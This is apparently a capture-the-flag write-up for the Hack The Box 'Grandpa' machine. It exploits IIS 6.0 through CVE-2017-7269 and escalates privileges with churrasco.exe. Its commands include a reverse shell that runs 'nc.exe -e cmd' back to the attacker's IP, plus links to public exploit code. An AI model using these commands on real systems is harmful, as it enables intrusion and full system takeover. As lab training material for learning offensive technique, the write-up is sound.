I found 1 open ports, 80(http). So let's focus on the websiteâ€¦

## Enumeration

As usual, I did a scan with gobuster, but this time I know that the shots are not going that way, as I got practically nothing useful.

![Untitled](/HTB/web-grandpa.png)

So how on the **Granny** machine I ran the `davtest` program, but didn't get much:

```ruby
â”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/grandpa]
â””â”€$ davtest -url http://10.10.10.14
********************************************************

At this point I started to get frustratedâ€¦

## Exploiting

I started looking for versions of everything to see if they were subject to any vulnerability until I found one that corresponded to **Microsoft IIS version 6.0**, and I exploited it ðŸ˜Ž

pd: **CVE-2017-7269**, website â†’ [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6 reverse shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell)

```ruby
python2 exploit.py 10.10.10.14 80 10.10.14.6 443
```

## Escalation of privileges

The first thing I always do in **windows** is to see what user we are and if we can access any input flag. In this case I could not access any flag, so I had to escalate privileges. The next thing I did was to see the permissions I had, with `whoami /priv`.

```ruby
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
**-> SeImpersonatePrivilege        Impersonate a client after authentication Enabled** 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

When I saw that the `SeImpersonatePrivilege` permission was enabled, the vulnerability called `JuicyPotato` came to my mind. 

So I will look for this vulnerability but according to the version of the victim machine because otherwise it would have no effect and we would waste our time. So I made a `systemminfo` and by the way I secured it in case I had to use it later for a vulnerability scan with `python2 windows-exploit-suggester.py -d 2023-08-30-mssb.xls -i /home/kali/HTB/granny/systemminfo.txt`. I got the following:

```

Now that I knew I was dealing with a `Microsoft(R) Windows(R) Server 2003, Standard Edition` all that was left was to look it up on the internet and download the exploit. The website â†’ https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

After this, the only thing left to do was to pass the exploit (churrasco.exe) through the smbserver to the victim machine together with the exploit I download previously called nc.exe or nc64.exe.

pd: website of nc.exe or nc64.exe â†’ https://github.com/int0x33/nc.exe/blob/master/nc.exe

```ruby
C:\WINDOWS\Temp\privesc>churrasco.exe "\\10.10.14.6\\smbFolder\nc.exe -e cmd 10.10.14.6 443"
churrasco.exe "\\10.10.14.6\\smbFolder\nc.exe -e cmd 10.10.14.6 443"
/churrasco/-->Current User: NETWORK SERVICE

```

But before running this I set myself to listen on port 443, on my machine.

Then I was root ðŸ˜Ž

```ruby
C:\DOCUME~1\Administrator\Desktop>whoami
whoami
nt authority\system

C:\DOCUME~1\Administrator\Desktop>typ root.txt
```
